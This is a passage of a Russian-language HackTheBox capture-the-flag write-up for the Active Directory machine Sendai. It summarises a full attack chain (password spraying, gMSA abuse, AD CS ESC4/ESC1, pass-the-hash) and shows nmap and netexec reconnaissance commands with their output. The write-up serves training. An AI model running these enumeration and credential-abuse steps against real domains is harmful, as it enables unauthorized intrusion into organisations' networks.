.097-.043"></path></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    THM: CherryBlossom (Hard)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📓 Заметки
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏷️ Тэги
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+<nav class="md-nav md-nav--secondary" aria-label="Оглавление">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Оглавление
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Резюме
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Цепочка атаки
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitre-attck-mapping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MITRE ATT&amp;CK MAPPING
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#t1046-t1039-t1087002" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Разведка и сбор данных — T1046, T1039, T1087.002
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#t1078002-t1069002-t1098-t1021006" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Получение начального доступа, перечисление домена и первый флаг — T1078.002, T1069.002, T1098, T1021.006
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#t1007-t1552002" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Локальное перечисление сервисов и извлечение учетных данных — T1007, T1552.002
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ad-cs-t1649-t1550002" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Эксплуатация AD CS, компрометация домена и второй флаг — T1649, T1550.002
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Извлеченные уроки
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Источники
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags">
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:active-directory" class="md-tag">Active Directory</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:esc" class="md-tag">ESC</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:medium" class="md-tag">Medium</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:windows" class="md-tag">Windows</a>
+      
+    
+  </nav>
+
+
+
+  <h1>HTB: Sendai (Medium)</h1>
+
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m22.51 6.457.001-.013a.89.89 0 0 0-.271-.638l-.027-.024q-.028-.025-.057-.048-.03-.022-.06-.04l-.029-.02-9.61-5.547a.89.89 0 0 0-.922.004L1.933 5.674l-.03.02-.023.014-.02.015a1 1 0 0 0-.147.134l-.003.003a.9.9 0 0 0-.221.584v.014l-.001.027v11.07c0 .328.18.63.469.784l9.599 5.542.023.011a1 1 0 0 0 .166.07l.04.01.072.015q.018.004.035.006a.8.8 0 0 0 .216 0q.018-.002.035-.006l.072-.014.04-.012.064-.022a1 1 0 0 0 .102-.047l.023-.011 9.599-5.542a.89.89 0 0 0 .469-.784V6.478zM5.255 6.082l6.537-3.774a.42.42 0 0 1 .418 0l6.537 3.774a.418.418 0 0 1 0 .725l-6.537 3.774a.42.42 0 0 1-.418 0L5.254 6.807a.418.418 0 0 1 0-.725m5.614 14.345a.417.417 0 0 1-.626.361l-6.524-3.766a.42.42 0 0 1-.209-.361V9.127a.417.417 0 0 1 .626-.361l6.524 3.766a.42.42 0 0 1 .209.362zm9.623-3.766a.42.42 0 0 1-.209.36l-6.524 3.767a.417.417 0 0 1-.626-.36v-7.533c0-.15.08-.287.209-.362l6.524-3.766a.417.417 0 0 1 .626.36z"></path></svg></span> <a href="https://app.hackthebox.com/machines/Sendai" target="_blank">Комната на HackTheBox</a></p>
+<div class="admonition danger">
+<p class="admonition-title">ОБРАТИТЕ ВНИМАНИЕ!</p>
+<p>В ходе написания райтапа и прикрепления вывода терминала/скриншотов с результатами работы различных тулов я не скрываю полученные хэши/пароли/флаги (иные подсказки) для того, чтобы люди, столкнувшиеся с определенными трудностями на каком-либо этапе, могли использовать мой райтап в качестве подсказки. Для тех, кто столкнулся с определенными сложностями в процессе компрометации данной машины, но не хочет получать готовые ответы, я использую спойлеры, под которыми находится вся секретная информация.</p>
+</div>
+<h2 id="_1">Резюме<a class="headerlink" href="#_1" title="Permanent link">¶</a></h2>
+<p><strong>Sendai</strong> - это машина на <strong>HackTheBox</strong> сложности уровня <strong>Medium</strong>. На данной машине представлена ОС Windows с доменом Active Directory. Отправной точкой атаки становится SMB, работающий на открытом 445 порту. Возможность анонимного доступа позволила обнаружить внутренний служебный файл <code>incident.txt</code>, в котором говорилось о недавней процедуре массового сброса паролей (юзеры должны были сменить пароль при следующей аутентификации). После получения списка пользователей с помощью <code>netexec</code> (<code>--rid-brute</code>) был выполнен <code>password spraying</code> с пустым паролем для выявления учетных записей с активным флагом <code>STATUS_PASSWORD_MUST_CHANGE</code>, в ходе чего было выявлено две учетные записи. Это позволило легитимно, используя RPC-вызовы, установить одной из данных учетных записей пароль, не зная предыдущего. В дальнейшем был проведен анализ возможностей скомпрометированной учетной записи в <code>BloodHound</code>, что привело к обнаружению разрешения <code>ReadGMSAPassword</code> у группы <code>Support</code>, в которой состояла скомпрометированная учетная запись <code>elliot.yates</code> в отношении компьютерной учетной записи <code>MGTSVC$</code>. С помощью <code>netexec</code> был получен хэш пароля данной учетной записи и выполнена аутентификация в системе от лица <code>MGTSVC$</code>, а также был найден первый флаг (<code>user.txt</code>). Локальное перечисление системы привело к обнаружению запуска одной из служб с передачей учетных данных пользователя домена <code>clifford.davey</code> в открытом виде. Данный пользователь, как выяснилось далее, состоял в группе <code>CA-OPERATORS</code>, у которой, в свою очередь, было разрешение <code>GenericAll</code> в отношении шаблона сертификата <code>SENDAICOMPUTER</code>, что привело к возможности вектора атаки на шаблон сертификата вида ESC4 и ESC1. После выпуска сертификата для пользователя <code>Administrator</code> была выполнена аутентификация с помощью данного сертификата с использованием тула <code>certipy-ad</code> и был получен хэш его пароля. Затем с помощью <code>evil-winrm</code> была получена интерактивная сессия и найден второй флаг (<code>root.txt</code>).</p>
+<h2 id="_2">Цепочка атаки<a class="headerlink" href="#_2" title="Permanent link">¶</a></h2>
+<blockquote>
+<p>Port Scanning (nmap) → SMB Enumeration (nxc / smbclient → incident.txt) → User Enumeration (nxc RID Brute-force) → 
+Forced Password Reset (impacket-changepasswd → elliot.yates) → AD Enumeration (bloodhound-python) → 
+Group Membership Abuse (bloodyAD → GenericAll → ADMSVC) → GMSA Abuse (nxc ldap → ReadGMSAPassword → MGTSVC) → 
+Remote Access (evil-winrm → MGTSVC$ → user.txt) → Local Service Enumeration (PowerShell → HKLM) → 
+Cleartext Credential Extraction (helpdesk.exe → clifford.davey) → AD CS Template Modification (ESC4 → certipy-ad) → 
+Certificate Enrollment (ESC1 → administrator) → Credential Extraction via PKINIT (certipy-ad) → 
+Pass-the-Hash (evil-winrm) → Domain Admin (root.txt)</p>
+</blockquote>
+<h2 id="mitre-attck-mapping">MITRE ATT&amp;CK MAPPING<a class="headerlink" href="#mitre-attck-mapping" title="Permanent link">¶</a></h2>
+<table>
+<thead>
+<tr>
+<th>Phase</th>
+<th>Tactic</th>
+<th>Technique</th>
+<th>ID</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Network Enumeration</td>
+<td>Discovery</td>
+<td>Network Service  Discovery</td>
+<td>T1046</td>
+</tr>
+<tr>
+<td>Data Collection (SMB)</td>
+<td>Collection</td>
+<td>Data from Network  Shared Drive</td>
+<td>T1039</td>
+</tr>
+<tr>
+<td>AD User Enumeration</td>
+<td>Discovery</td>
+<td>Account Discovery:  Domain Account</td>
+<td>T1087.002</td>
+</tr>
+<tr>
+<td>Account Takeover</td>
+<td>Initial Access</td>
+<td>Valid Accounts:  Domain Accounts</td>
+<td>T1078.002</td>
+</tr>
+<tr>
+<td>AD Privilege Discovery</td>
+<td>Discovery</td>
+<td>Permission Groups  Discovery: Domain Groups</td>
+<td>T1069.002</td>
+</tr>
+<tr>
+<td>Group Membership Abuse</td>
+<td>Privilege Escalation</td>
+<td>Account Manipulation</td>
+<td>T1098</td>
+</tr>
+<tr>
+<td>Remote Execution</td>
+<td>Lateral Movement</td>
+<td>Remote Services:  Windows Remote Management</td>
+<td>T1021.006</td>
+</tr>
+<tr>
+<td>Local Service Enum</td>
+<td>Discovery</td>
+<td>System Service Discovery</td>
+<td>T1007</td>
+</tr>
+<tr>
+<td>Cleartext Credential  Extraction</td>
+<td>Credential Access</td>
+<td>Unsecured Credentials:  Credentials in Registry</td>
+<td>T1552.002</td>
+</tr>
+<tr>
+<td>AD CS Exploitation</td>
+<td>Credential Access</td>
+<td>Steal or Forge  Authentication Certificates</td>
+<td>T1649</td>
+</tr>
+<tr>
+<td>Domain Privilege  Escalation</td>
+<td>Lateral Movement</td>
+<td>Use Alternate Authentication  Material: Pass the Hash</td>
+<td>T1550.002</td>
+</tr>
+</tbody>
+</table>
+<h2 id="t1046-t1039-t1087002">Разведка и сбор данных — <code>T1046</code>, <code>T1039</code>, <code>T1087.002</code><a class="headerlink" href="#t1046-t1039-t1087002" title="Permanent link">¶</a></h2>
+<details class="note">
+<summary>Результат сканирования <code>nmap</code></summary>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:1"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio"><div class="tabbed-labels"><label for="__tabbed_1_1">nmap</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span>
+<span class="normal">60</span>
+<span class="normal">61</span>
+<span class="normal">62</span>
+<span class="normal">63</span>
+<span class="normal">64</span>
+<span class="normal">65</span>
+<span class="normal">66</span>
+<span class="normal">67</span>
+<span class="normal">68</span>
+<span class="normal">69</span>
+<span class="normal">70</span>
+<span class="normal">71</span>
+<span class="normal">72</span>
+<span class="normal">73</span>
+<span class="normal">74</span>
+<span class="normal">75</span>
+<span class="normal">76</span>
+<span class="normal">77</span>
+<span class="normal">78</span>
+<span class="normal">79</span>
+<span class="normal">80</span>
+<span class="normal">81</span>
+<span class="normal">82</span>
+<span class="normal">83</span>
+<span class="normal">84</span>
+<span class="normal">85</span>
+<span class="normal">86</span>
+<span class="normal">87</span>
+<span class="normal">88</span>
+<span class="normal">89</span>
+<span class="normal">90</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.129.59.196
+<span class="go">Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-17 23:14 EDT</span>
+<span class="go">Nmap scan report for 10.129.59.196</span>
+<span class="go">Host is up (0.0080s latency).</span>
+<span class="go">Not shown: 65511 filtered tcp ports (no-response)</span>
+<span class="go">PORT      STATE SERVICE       VERSION</span>
+<span class="go">53/tcp    open  domain        Simple DNS Plus</span>
+<span class="go">80/tcp    open  http          Microsoft IIS httpd 10.0</span>
+<span class="go">| http-methods: </span>
+<span class="go">|_  Potentially risky methods: TRACE</span>
+<span class="go">|_http-title: IIS Windows Server</span>
+<span class="go">|_http-server-header: Microsoft-IIS/10.0</span>
+<span class="go">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-18 03:16:21Z)</span>
+<span class="go">135/tcp   open  msrpc         Microsoft Windows RPC</span>
+<span class="go">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="go">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)</span>
+<span class="go">|_ssl-date: TLS randomness does not represent time</span>
+<span class="go">| ssl-cert: Subject: commonName=dc.sendai.vl</span>
+<span class="go">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.sendai.vl</span>
+<span class="go">| Not valid before: 2026-09-18T03:03:13</span>
+<span class="go">|_Not valid after:  2027-09-18T03:03:13</span>
+<span class="go">443/tcp   open  ssl/http      Microsoft IIS httpd 10.0</span>
+<span class="go">|_ssl-date: TLS randomness does not represent time</span>
+<span class="go">|_http-server-header: Microsoft-IIS/10.0</span>
+<span class="go">|_http-title: IIS Windows Server</span>
+<span class="go">| http-methods: </span>
+<span class="go">|_  Potentially risky methods: TRACE</span>
+<span class="go">| ssl-cert: Subject: commonName=dc.sendai.vl</span>
+<span class="go">| Subject Alternative Name: DNS:dc.sendai.vl</span>
+<span class="go">| Not valid before: 2023-07-18T12:39:21</span>
+<span class="go">|_Not valid after:  2024-07-18T00:00:00</span>
+<span class="go">445/tcp   open  microsoft-ds?</span>
+<span class="go">464/tcp   open  kpasswd5?</span>
+<span class="go">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="go">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)</span>
+<span class="go">| ssl-cert: Subject: commonName=dc.sendai.vl</span>
+<span class="go">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.sendai.vl</span>
+<span class="go">| Not valid before: 2026-09-18T03:03:13</span>
+<span class="go">|_Not valid after:  2027-09-18T03:03:13</span>
+<span class="go">|_ssl-date: TLS randomness does not represent time</span>
+<span class="go">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)</span>
+<span class="go">|_ssl-date: TLS randomness does not represent time</span>
+<span class="go">| ssl-cert: Subject: commonName=dc.sendai.vl</span>
+<span class="go">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.sendai.vl</span>
+<span class="go">| Not valid before: 2026-09-18T03:03:13</span>
+<span class="go">|_Not valid after:  2027-09-18T03:03:13</span>
+<span class="go">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)</span>
+<span class="go">| ssl-cert: Subject: commonName=dc.sendai.vl</span>
+<span class="go">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.sendai.vl</span>
+<span class="go">| Not valid before: 2026-09-18T03:03:13</span>
+<span class="go">|_Not valid after:  2027-09-18T03:03:13</span>
+<span class="go">|_ssl-date: TLS randomness does not represent time</span>
+<span class="go">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span>
+<span class="go">| rdp-ntlm-info: </span>
+<span class="go">|   Target_Name: SENDAI</span>
+<span class="go">|   NetBIOS_Domain_Name: SENDAI</span>
+<span class="go">|   NetBIOS_Computer_Name: DC</span>
+<span class="go">|   DNS_Domain_Name: sendai.vl</span>
+<span class="go">|   DNS_Computer_Name: dc.sendai.vl</span>
+<span class="go">|   DNS_Tree_Name: sendai.vl</span>
+<span class="go">|   Product_Version: 10.0.20348</span>
+<span class="go">|_  System_Time: 2026-09-18T03:17:16+00:00</span>
+<span class="go">|_ssl-date: 2026-09-18T03:17:54+00:00; 0s from scanner time.</span>
+<span class="go">| ssl-cert: Subject: commonName=dc.sendai.vl</span>
+<span class="go">| Not valid before: 2026-09-17T03:12:17</span>
+<span class="go">|_Not valid after:  2027-03-19T03:12:17</span>
+<span class="go">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="go">|_http-title: Not Found</span>
+<span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0</span>
+<span class="go">9389/tcp  open  mc-nmf        .NET Message Framing</span>
+<span class="go">49664/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">49667/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="go">49674/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">49679/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">59361/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">59368/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">59403/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Host script results:</span>
+<span class="go">| smb2-time: </span>
+<span class="go">|   date: 2026-09-18T03:17:19</span>
+<span class="go">|_  start_date: N/A</span>
+<span class="go">| smb2-security-mode: </span>
+<span class="go">|   3:1:1: </span>
+<span class="go">|_    Message signing enabled and required</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 205.82 seconds</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+</details>
+<p>Выполненное сканирование при помощи <code>nmap</code> подтверждает, что перед нами хост, на котором располагается домен Active Directory, причем, представленный хост является контроллером домена. Из вывода <code>nmap</code> мы также видим, что FQDN является <code>dc.sendai.vl</code>. Заметив открытый <code>445 (smb)</code> порт, было решено попробовать выполнить подключение с анонимным доступом, для этого можно воспользоваться тулом <code>netexec</code>.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="2:1"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio"><div class="tabbed-labels"><label for="__tabbed_2_1">netexec</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.59.196<span class="w"> </span>-u<span class="w"> </span><span class="s1">'guest'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span>
+<span class="go">SMB         10.129.59.196   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)</span>
+<span class="go">SMB         10.129.59.196   445    DC               [+] sendai.vl\guest:</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+<p>Результат работы <code>netexec</code> подтверждает наше предположение касательно анонимного доступа, мы успешно можем подключиться к SMB в качестве гостя. Пользуясь данной возможностью, выполним перечисление доступных нам для просмотра шар, юзеров (посредством опции <code>--rid-brute</code>), а также сгенерируем конфигурацию для <code>/etc/hosts</code> (при помощи опциии <code>--generate-hosts-file</code>).</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="3:3"><input checked="checked" id="__tabbed_3_1" name="__tabbed_3" type="radio"><input id="__tabbed_3_2" name="__tabbed_3" type="radio"><input id="__tabbed_3_3" name="__tabbed_3" type="radio"><div class="tabbed-labels"><label for="__tabbed_3_1">nxc --shares</label><label for="__tabbed_3_2">nxc --rid-brute</label><label for="__tabbed_3_3">nxc --generate-hosts-file</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.59.196<span class="w"> </span>-u<span class="w"> </span><span class="s1">'guest'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+<span class="go">SMB         10.129.59.196   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)</span>
+<span class="go">SMB         10.129.59.196   445    DC               [+] sendai.vl\guest: </span>
+<span class="go">SMB         10.129.59.196   445    DC               [*] Enumerated shares</span>
+<span class="go">SMB         10.129.59.196   445    DC               Share           Permissions     Remark</span>
+<span class="go">SMB         10.129.59.196   445    DC               -----           -----------     ------</span>
+<span class="go">SMB         10.129.59.196   445    DC               ADMIN$                          Remote Admin</span>
+<span class="go">SMB         10.129.59.196   445    DC               C$                              Default share</span>
+<span class="go">SMB         10.129.59.196   445    DC               config                          </span>
+<span class="go">SMB         10.129.59.196   445    DC               IPC$            READ            Remote IPC</span>
+<span class="go">SMB         10.129.59.196   445    DC               NETLOGON                        Logon server share </span>
+<span class="go">SMB         10.129.59.196   445    DC               sendai          READ            company share</span>
+<span class="go">SMB         10.129.59.196   445    DC               SYSVOL                          Logon server share </span>
+<span class="go">SMB         10.129.59.196   445    DC               Users           READ</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.59.196<span class="w"> </span>-u<span class="w"> </span><span class="s1">'guest'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--rid-brute
+<span class="go">SMB         10.129.59.196   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)</span>
+<span class="go">SMB         10.129.59.196   445    DC               [+] sendai.vl\guest: </span>
+<span class="go">SMB         10.129.59.196   445    DC               498: SENDAI\Enterprise Read-only Domain Controllers (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               500: SENDAI\Administrator (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               501: SENDAI\Guest (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               502: SENDAI\krbtgt (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               512: SENDAI\Domain Admins (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               513: SENDAI\Domain Users (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               514: SENDAI\Domain Guests (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               515: SENDAI\Domain Computers (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               516: SENDAI\Domain Controllers (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               517: SENDAI\Cert Publishers (SidTypeAlias)</span>
+<span class="go">SMB         10.129.59.196   445    DC               518: SENDAI\Schema Admins (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               519: SENDAI\Enterprise Admins (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               520: SENDAI\Group Policy Creator Owners (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               521: SENDAI\Read-only Domain Controllers (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               522: SENDAI\Cloneable Domain Controllers (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               525: SENDAI\Protected Users (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               526: SENDAI\Key Admins (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               527: SENDAI\Enterprise Key Admins (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               553: SENDAI\RAS and IAS Servers (SidTypeAlias)</span>
+<span class="go">SMB         10.129.59.196   445    DC               571: SENDAI\Allowed RODC Password Replication Group (SidTypeAlias)</span>
+<span class="go">SMB         10.129.59.196   445    DC               572: SENDAI\Denied RODC Password Replication Group (SidTypeAlias)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1000: SENDAI\DC$ (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1101: SENDAI\DnsAdmins (SidTypeAlias)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1102: SENDAI\DnsUpdateProxy (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1103: SENDAI\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1104: SENDAI\sqlsvc (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1105: SENDAI\websvc (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1107: SENDAI\staff (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1108: SENDAI\Dorothy.Jones (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1109: SENDAI\Kerry.Robinson (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1110: SENDAI\Naomi.Gardner (SidTypeUser)</span>
